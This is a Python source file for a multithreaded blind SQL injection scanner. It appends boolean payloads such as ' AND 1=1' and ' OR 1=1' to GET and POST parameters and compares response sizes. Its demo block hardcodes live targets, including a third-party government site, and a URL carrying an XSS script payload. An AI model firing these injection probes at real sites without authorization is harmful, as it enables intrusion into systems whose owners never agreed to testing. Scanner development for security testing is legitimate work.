from __future__ import division
import sys
import codecs
import logging
from requests import Response
import traceback
from urlparse import urlparse, parse_qs

from massweb.fuzzers.ifuzzer import iFuzzer

from massweb.mass_requests.mass_request import MassRequest

from massweb.payloads.bsqli_payload import BSQLIPayload
from massweb.payloads.bsqli_payload_group import BSQLIPayloadGroup

from massweb.results.result import Result

from massweb.targets.target import Target
from massweb.targets.fuzzy_target import FuzzyTarget
from massweb.targets.fuzzy_target_group import FuzzyTargetGroup

#FIXME: Duplicate code
# Setup loger
logging.basicConfig(format='%(asctime)s %(name)s: %(message)s',
                    datefmt='%m/%d/%Y %I:%M:%S %p')
logger = logging.getLogger('BSQLIFuzzer')
logger.setLevel(logging.INFO)

sys.stdin = codecs.getreader('utf-8')(sys.stdin)
sys.stderr = codecs.getwriter('utf-8')(sys.stderr)
#END Duplicate code

#FIXME: Double check for duplicate code between files
class BSQLiFuzzer(iFuzzer):
    """ FIXME: Docstring """

    def __init__(self, targets, bsqli_payload_groups = [], num_threads = 10, time_per_url = 10, request_timeout = 10, proxy_list = [{}], hadoop_reporting = False, payload_groups = []):
        """ FIXME: Docstring
        targets
        bsqli_payload_groups = []
        num_threads = 10
        time_per_url = 10
        request_timeout = 10
        proxy_list = [{}]
        hadoop_reporting = False
        payload_groups = []
        """
        # do this because we may need to create more MassRequest objects in
        #  checks (like bsqli), needs to be configured the same
        self.mreq_config_dict = {"num_threads" : num_threads,
                "time_per_url" : time_per_url,
                "request_timeout" : request_timeout,
                "proxy_list" : proxy_list,
                "hadoop_reporting" : hadoop_reporting}
        self.mreq = MassRequest(**self.mreq_config_dict)
        self.allowed_variance = 0.2
        self.targets = targets
        self.payload_groups = payload_groups
        self.determine_posts_from_targets()
        self.stable_targets = []
        self.unstable_targets = []
        self.hadoop_reporting = hadoop_reporting
        if self.hadoop_reporting:
            logger.info("Hadoop reporting set in fuzzer")
        self.bsqli_payload_groups = bsqli_payload_groups
        for target in targets:
            try:
                max_content_length_variance = self.__check_url_stability(target)
                if max_content_length_variance > self.allowed_variance:
                    if hadoop_reporting:
                        logger.info(u"Found unstable target %s",
                                    unicode(target))
                    self.unstable_targets.append(target)
                else:
                    logger.info(u"Found stable target %s", unicode(target))
                    self.stable_targets.append(target)
            except:
                if self.hadoop_reporting:
                    logger.info(u"Found unstable target %s due to exception:",
                                unicode(target))
                self.unstable_targets.append(target)

    def __get_first_successful_response(self, results):
        """ FIXME: Docstring """
        for index, result in enumerate(results):
            target, response = result[0], result[1]
            if isinstance(response, Response):
                response.raise_for_status()
                if not response.content:
                    continue

                return index, response

        return None, None

    def __check_url_stability(self, target, set_size = 10, successful_compares_required = 6):
        """ FIXME: Docstring """
        if self.hadoop_reporting:
            logger.info(u"Determining stability for %s", unicode(target))
        mreq = MassRequest(**self.mreq_config_dict)
        targets = [target]
        #FIXME: Investigate why this is looping against a list
        for i in range(0, set_size):
            targets.append(target)
        mreq.request_targets(targets)
        baseline_element_used, baseline_response = self.__get_first_successful_response(mreq.results)
        if not baseline_response:
            raise Exception("Didn't get a successful response from the URL, can't determine stability")
        #remove baseline element
        del mreq.results[baseline_element_used]
        content_length_variance = []
        for r in mreq.results:
            target, response = r[0], r[1]
            if not isinstance(response, Response):
                continue
            content_length_variance.append(((1 - len(response.content)/len(baseline_response.content)) * 100))
        if len(content_length_variance) < successful_compares_required:
            raise Exception("Didn't get enough successful compares to determine stability")
        max_content_length_variance = abs(max(content_length_variance))
        return max_content_length_variance

    def __build_get_fuzzy_target_group_from_payload_group(self, target, bsqli_payload_group):
        """ FIXME: Docstring """
        url = target.url
        parsed_url = urlparse(url)
        parsed_url_query = parsed_url.query
        url_q_dic = parse_qs(parsed_url_query)
        #FIXME: Investigate this -> i have no idea why an empty list has to be called to reinstantiate this object properly?
        fuzzy_target_groups = []
        for query_param, query_val in url_q_dic.iteritems():
            ftg = FuzzyTargetGroup()
            true_fuzzy_url = (self.append_to_param(url, query_param, str(bsqli_payload_group.true_payload)))
            true_fuzzy_target = FuzzyTarget(true_fuzzy_url, url, query_param, "get", payload = bsqli_payload_group.true_payload)
            ftg.add_target(true_fuzzy_target)
            false_fuzzy_url = (self.append_to_param(url, query_param, str(bsqli_payload_group.false_payload)))
            false_fuzzy_target = FuzzyTarget(false_fuzzy_url, url, query_param, "get", payload = bsqli_payload_group.false_payload)
            ftg.add_target(false_fuzzy_target)
            fuzzy_target_groups.append(ftg)
        return fuzzy_target_groups

    def __build_post_fuzzy_target_group_from_payload_group(self, target, bsqli_payload_group):
        """ FIXME: Docstring """
        url = target.url
        post_keys = target.data.keys()
        #FIXME: Investigate why. !i have no idea why an empty list has to be called to reinstantiate this object properly?
        #  appears to be missing the self prefix and is defined in the method below
        fuzzy_target_groups = []
        for key in post_keys:
            ftg = FuzzyTargetGroup()
            true_payload = bsqli_payload_group.true_payload
            data_copy = target.data.copy()
            data_copy[key] = data_copy[key] + str(true_payload)
            fuzzy_target = FuzzyTarget(url, url, key, "post", data = data_copy.copy(), payload = true_payload, unfuzzed_data = target.data)
            ftg.add_target(fuzzy_target)
            false_payload = bsqli_payload_group.false_payload
            data_copy = target.data.copy()
            data_copy[key] = data_copy[key] + str(false_payload)
            fuzzy_target = FuzzyTarget(url, url, key, "post", data = data_copy.copy(), payload = false_payload, unfuzzed_data = target.data)
            ftg.add_target(fuzzy_target)
            fuzzy_target_groups.append(ftg)
        return fuzzy_target_groups

    def __build_fuzzy_target_groups(self):
        """ FIXME: Docstring """
        #FIXME: should this be defined here? (see pylint)
        self.fuzzy_target_groups = []
        for bsqli_payload_group in self.bsqli_payload_groups:
            for target in self.targets:
                if target.ttype == "get":
                    ftgs = self.__build_get_fuzzy_target_group_from_payload_group(target, bsqli_payload_group)
                elif target.ttype == "post":
                    ftgs = self.__build_post_fuzzy_target_group_from_payload_group(target, bsqli_payload_group)
                for ftg in ftgs:
                    self.fuzzy_target_groups.append(ftg)
        #FIXME: does this need to return since it's referencing a property?
        return self.fuzzy_target_groups

    def request_target_group(self, fuzzy_target_group):
        """ FIXME: fill in docstring
        fuzzy_target_group ___
        """
        #FIXME: should this be self.mreq?
        mreq = MassRequest(**self.mreq_config_dict)
        mreq.request_targets(fuzzy_target_group.fuzzy_targets)
        return mreq.results

    def check_for_bsqli(self, fuzzy_target_group):
        """ FIXME: fill in docstring
        fuzzy_target_group ___
        """
        if self.hadoop_reporting:
            logger.info("Checking for BlindSQL in %s", fuzzy_target_group.fuzzy_targets[0].unfuzzed_url)
        request_results = self.request_target_group(fuzzy_target_group)
        for request_result in request_results:
            fuzzy_target, response = request_result
            if fuzzy_target.payload.payload_attributes["truth"] == True:
                true_target, true_response = fuzzy_target, response
            elif fuzzy_target.payload.payload_attributes["truth"] == False:
                false_target, false_response = fuzzy_target, response
            else:
                raise Exception("BSQLI target doesn't have truth attribute")
        try:
            true_content_length = len(true_response.content)
            false_content_length = len(false_response.content)
        except:
            raise Exception("Either the true or the false request failed and true_content_length and false_content_length were not set ")

        if true_content_length > 2*false_content_length:
            if self.hadoop_reporting:
                logger.info("Found a Blind SQL result with true response content of %s and false of %s", true_content_length, false_content_length)
            return True
        else:
            if self.hadoop_reporting:
                logger.info("No Blind SQL with true response content of %s and false of %s", true_content_length, false_content_length)
            return False

    def fuzz_hook(self):
        """ FIXME: Docstring """
        self.__build_fuzzy_target_groups()
        fuzzy_target_groups = self.__build_fuzzy_target_groups()
        results = []
        for ftg in fuzzy_target_groups:
            result_dic = {}
            '''for fuzzy_target in ftg.fuzzy_targets:
                random_debug = """================================================
fuzzy_target.url
print fuzzy_target.ttype
print fuzzy_target.data
print fuzzy_target.payload
print fuzzy_target.unfuzzed_data
print fuzzy_target.unfuzzed_url
print fuzzy_target.payload.payload_attributes
================================================"""
                pring(random_debug)'''
            try:
                if ftg.fuzzy_targets[0].unfuzzed_target in self.unstable_targets:
                    logger.info(u"Target %s is unstable so marking bsqli result as false", unicode(ftg.fuzzy_targets[0].unfuzzed_target))
                    result_dic["bsqli"] = False
                else:
                    #!bsqli check here
                    result_dic["bsqli"] = self.check_for_bsqli(ftg)
            except:
                if self.hadoop_reporting:
                    logger.info(u"Caught exception trying to perform BSQLi check on %s :", unicode(ftg.fuzzy_targets[0].unfuzzed_target))
                    traceback.print_exc()
                    result_dic["bsqli"] = False
            results.append(Result(ftg.fuzzy_targets[0], result_dic))
        return results


if __name__ == "__main__":
    #FIXME: Comments
    target = Target(u"http://www.hyperiongray.com/?q=333&q2=v2")
    target2 = Target(u"http://prisons.ir/index.php?Module=SMMNewsAgency&SMMOp=View&SMM_CMD=&PageId=6935", ttype = "get")
    target3 = Target(u"http://course.hyperiongray.com/vuln2/898538a7335fd8e6bac310f079ba3fd1/?dd=%3Cscript%3Ealert%2833%29%3C/script%3E")
    target4 = Target(u"http://course.hyperiongray.com/bsqli-example/?q=44", ttype = "get")

    generic_true_payload =  BSQLIPayload(" AND 1=1", {"truth" : True})
    generic_false_payload =  BSQLIPayload(" AND 1=2", {"truth" : False})
    generic_payload_group = BSQLIPayloadGroup(generic_true_payload, generic_false_payload)

    dump_true_payload =  BSQLIPayload(" OR 1=1", {"truth" : True})
    dump_false_payload =  BSQLIPayload(" OR 1=2", {"truth" : False})
    dump_payload_group = BSQLIPayloadGroup(dump_true_payload, dump_false_payload)

    payload_groups = [generic_payload_group, dump_payload_group]

    bf = BSQLiFuzzer([target, target2, target3, target4], bsqli_payload_groups = payload_groups, hadoop_reporting=True, num_threads = 5)
    for result in bf.fuzz():
        print result
